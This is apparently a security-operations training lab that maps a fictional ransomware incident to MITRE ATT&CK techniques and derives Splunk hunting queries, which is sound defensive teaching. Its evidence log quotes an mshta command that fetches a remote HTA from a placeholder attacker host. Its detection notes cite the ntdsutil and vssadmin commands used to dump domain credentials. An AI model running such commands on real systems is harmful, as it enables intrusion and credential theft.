# Demo 04: Mapping an Incident to MITRE ATT&CK Techniques

**Duration:** ~30 minutes

**Level:** Intermediate

**Environment:** Docker (local ATT&CK API + Python tools)

---

## Overview

This demo provides a systematic, step-by-step workflow for mapping incident evidence to MITRE ATT&CK techniques.
It introduces a structured methodology that SOC analysts can apply to any incident, using a Python-based toolkit that queries the ATT&CK STIX data locally.

---

## Lab Setup

```console
cd demos/demo-04-mitre-attack-mapping
docker compose up -d
```

The container installs `mitreattack-python` and provides interactive tools.

Verify setup:

```console
docker exec demo04-attack python3 /tools/verify_setup.py
```

Expected:

```text
ATT&CK data loaded: 14 tactics, 196 techniques (Enterprise)
Ready.
```

---

## Scenario

The following evidence has been collected from incident **INC-2024-1102** — a suspected ransomware pre-deployment campaign:

```text
EVIDENCE LOG — INC-2024-1102
==============================

1. Email with .lnk attachment delivered to finance department (3 users)

2. LNK file executed: cmd /c mshta.exe http://bad-host.xyz/stage2.hta
3. MSHTA.EXE executed HTA file → VBScript payload
4. VBScript downloaded and executed a PE (Cobalt Strike beacon)
5. Cobalt Strike beacon calling back to 95.211.45.77 on port 443 (HTTPS)
6. Beacon maintained persistence via registry Run key
7. Beacon performed: arp -a, ping sweep, port scan of internal /24
8. Cobalt Strike lateral tool transfer via SMB (beacon.dll staged)
9. Domain admin credentials obtained from NTDS.dit (Volume Shadow Copy)
10. Scheduled tasks created on all Domain Controllers for "persistence"
11. 500GB of data staged to encrypted SMB share before ransomware
12. Ransomware deployed to all systems via GPO (Group Policy)
```

---

## Part 1: Systematic Evidence Mapping

### Step 1.1 — Run the evidence classifier

```console
docker exec demo04-attack python3 /tools/classify_evidence.py \
  --evidence-file /data/evidence-INC-2024-1102.txt
```

The tool parses each evidence item and suggests matching techniques:

```text
Evidence Item 1: Email with .lnk attachment
  → T1566.001: Phishing: Spearphishing Attachment (Confidence: HIGH)
  → T1204.002: User Execution: Malicious File (Confidence: HIGH)

Evidence Item 2: LNK executing mshta.exe
  → T1059.005: Command and Scripting Interpreter: Visual Basic (Confidence: HIGH)
  → T1218.005: Signed Binary Proxy Execution: Mshta (Confidence: HIGH)
  → T1027: Obfuscated Files or Information (Confidence: MEDIUM)

Evidence Item 3: MSHTA → VBScript → PE download
  → T1105: Ingress Tool Transfer (Confidence: HIGH)
  → T1059.005: Visual Basic (Confidence: HIGH)

Evidence Item 4: Cobalt Strike beacon
  → T1071.001: Application Layer Protocol: Web Protocols (Confidence: HIGH)
  → T1132: Data Encoding (Confidence: MEDIUM)

Evidence Item 5: HTTPS C2 on port 443
  → T1071.001: Web Protocols (Confidence: HIGH)
  → T1573.002: Encrypted Channel: Asymmetric Cryptography (Confidence: HIGH)

Evidence Item 6: Registry Run key persistence
  → T1547.001: Boot or Logon Autostart Execution: Registry Run Keys (Confidence: HIGH)

Evidence Item 7: arp, ping sweep, port scan
  → T1018: Remote System Discovery (Confidence: HIGH)
  → T1046: Network Service Discovery (Confidence: HIGH)
  → T1040: Network Sniffing (Confidence: LOW)

Evidence Item 8: Lateral movement via SMB
  → T1570: Lateral Tool Transfer (Confidence: HIGH)
  → T1021.002: Remote Services: SMB/Windows Admin Shares (Confidence: HIGH)

Evidence Item 9: NTDS.dit via Volume Shadow Copy
  → T1003.003: OS Credential Dumping: NTDS (Confidence: HIGH)
  → T1003.002: OS Credential Dumping: Security Account Manager (Confidence: MEDIUM)

Evidence Item 10: Scheduled tasks on DCs
  → T1053.005: Scheduled Task/Job: Scheduled Task (Confidence: HIGH)

Evidence Item 11: Data staging to SMB share
  → T1074.002: Remote Data Staging (Confidence: HIGH)
  → T1560.001: Archive Collected Data: Archive via Utility (Confidence: MEDIUM)

Evidence Item 12: GPO-based ransomware deployment
  → T1484.001: Domain Policy Modification: Group Policy Modification (Confidence: HIGH)
  → T1486: Data Encrypted for Impact (Confidence: HIGH)
```

### Step 1.2 — Generate the ATT&CK mapping table

```console
docker exec demo04-attack python3 /tools/generate_mapping.py \
  --incident INC-2024-1102 \
  --output /output/mapping-table.md
```

```console
docker exec demo04-attack cat /output/mapping-table.md
```

Output:

```markdown
# ATT&CK Mapping — INC-2024-1102

| Tactic | ID | Technique | Evidence | Confidence |
|--------|----|-----------|----------|------------|
| Initial Access | T1566.001 | Phishing: Spearphishing Attachment | LNK in email | HIGH |
| Execution | T1204.002 | User Execution: Malicious File | User ran LNK | HIGH |
| Execution | T1218.005 | Signed Binary Proxy Execution: Mshta | mshta.exe used | HIGH |
| Execution | T1059.005 | Visual Basic | VBScript payload | HIGH |
| C2 | T1071.001 | Application Layer Protocol: Web Protocols | CS beacon HTTPS | HIGH |
| C2 | T1573.002 | Encrypted Channel: Asymmetric Cryptography | TLS on port 443 | HIGH |
| Persistence | T1547.001 | Registry Run Keys | Run key created | HIGH |
| Persistence | T1053.005 | Scheduled Task | Tasks on DCs | HIGH |
| Discovery | T1018 | Remote System Discovery | arp -a, ping sweep | HIGH |
| Discovery | T1046 | Network Service Discovery | Port scan internal | HIGH |
| Lateral Movement | T1021.002 | Remote Services: SMB | Beacon via SMB | HIGH |
| Lateral Movement | T1570 | Lateral Tool Transfer | beacon.dll staged | HIGH |
| Credential Access | T1003.003 | OS Cred Dump: NTDS | NTDS.dit via VSS | HIGH |
| Collection | T1074.002 | Remote Data Staging | SMB share staging | HIGH |
| Collection | T1560.001 | Archive via Utility | 500 GB encrypted archive | MEDIUM |
| Defense Evasion | T1484.001 | Group Policy Modification | GPO for deployment | HIGH |
| Impact | T1486 | Data Encrypted for Impact | Ransomware deployed | HIGH |
```

---

## Part 2: Find Related Detection Opportunities

### Step 2.1 — Query ATT&CK for detection data sources

```console
docker exec demo04-attack python3 /tools/get_detections.py --technique T1003.003
```

```text
Technique: T1003.003 — OS Credential Dumping: NTDS
Tactic: Credential Access

Detection Data Sources:
  - Command: Process command-line parameters (ntdsutil, vssadmin, wmic shadow)
  - File: File access (NTDS.dit, SYSTEM hive)
  - Windows Registry: Registry key access (HKLM\SYSTEM\CurrentControlSet\Services\NTDS)

Detection Notes:
  Monitor for ntdsutil "ac i ntds" "ifm" "create full <path>"
  Monitor vssadmin create shadow /for=C:
  Monitor for NTDS.dit file access by non-system processes
  Monitor for volume shadow copy creation followed by file copy from VSS path

Mitigations:
  M1027 - Password Policies
  M1026 - Privileged Account Management
  M1017 - User Training
```

### Step 2.2 — Generate hunting queries for all confirmed techniques

```console
docker exec demo04-attack python3 /tools/generate_hunt_queries.py \
  --incident INC-2024-1102 \
  --format splunk \
  --output /output/hunt-queries-splunk.spl
```

```console
docker exec demo04-attack cat /output/hunt-queries-splunk.spl
```

Sample output:

```spl
/* Hunt: T1218.005 - Mshta.exe Proxy Execution */
index=sysmon EventID=1 Image="*mshta.exe*"
| where like(CommandLine, "%http%") OR like(CommandLine, "%ftp%") OR like(CommandLine, "%\\\\%")
| table _time, Computer, User, CommandLine, ParentImage

/* Hunt: T1003.003 - NTDS Credential Dumping */
index=sysmon EventID=1
| where like(CommandLine, "%ntdsutil%") OR
        like(CommandLine, "%vssadmin%create%shadow%") OR
        like(CommandLine, "%ntds.dit%")
| table _time, Computer, User, CommandLine

/* Hunt: T1484.001 - GPO Modification */
index=winlogs EventCode=5136
| where Object_Class="groupPolicyContainer"
| table _time, Subject_User_Name, Object_DN, Attribute_LDAPDisplay_Name
```

---

## Part 3: Build a Threat Actor Profile from TTPs

### Step 3.1 — Search for groups matching this TTP set

```console
docker exec demo04-attack python3 /tools/actor_match.py \
  --techniques T1566.001,T1218.005,T1059.005,T1071.001,T1003.003,T1484.001,T1486 \
  --min-match 5
```

```text
Actor Matching Report — INC-2024-1102
=======================================
Matching threshold: 5 of 7 provided techniques

Results:
  Group          Techniques matched   Match score   Notes
  ──────────────────────────────────────────────────────────
  Wizard Spider  7/7                  100%          Highly likely match
  Ryuk gang      6/7                   86%          Uses Conti/Ryuk ransomware
  FIN12          5/7                   71%          Ransomware affiliate

NOTE: TTP overlap does not confirm attribution. Multiple groups share techniques.
Cobalt Strike is used by hundreds of actors — requires additional signals.
```

### Step 3.2 — Export the final ATT&CK Navigator layer

```console
docker exec demo04-attack python3 /tools/export_navigator.py \
  --incident INC-2024-1102 \
  --output /output/INC-2024-1102-navigator.json
```

This creates a ready-to-import ATT&CK Navigator JSON file with:

* All confirmed techniques highlighted in red
* Confidence level encoded as score
* Comments with evidence per technique

---

## Part 4: Document for the Post-Incident Report

### Step 4.1 — Generate ATT&CK section for PIR

```console
docker exec demo04-attack python3 /tools/generate_pir_section.py \
  --incident INC-2024-1102 \
  --output /output/pir-attack-section.md
```

The output is a formatted markdown section ready to paste into the Post-Incident Report, including:

* Tactic-by-tactic narrative
* ATT&CK technique table
* Navigator layer reference
* Recommended detections per tactic

---

## Cleanup

```console
docker compose down -v
```

---

## Key Takeaways

1. **Systematic mapping produces consistency** — every analyst following this process reaches the same conclusions from the same evidence.
1. **ATT&CK technique IDs are stable** — they enable cross-organization sharing without disclosing sensitive details.
1. **From techniques, derive detections** — each mapped technique tells you what data sources and queries to build.
1. **Actor matching is probabilistic** — TTP overlap suggests candidates, never confirms identity.
1. **GPO-based deployment (T1484.001) is severe** — it means the attacker achieved full domain compromise before deploying ransomware.
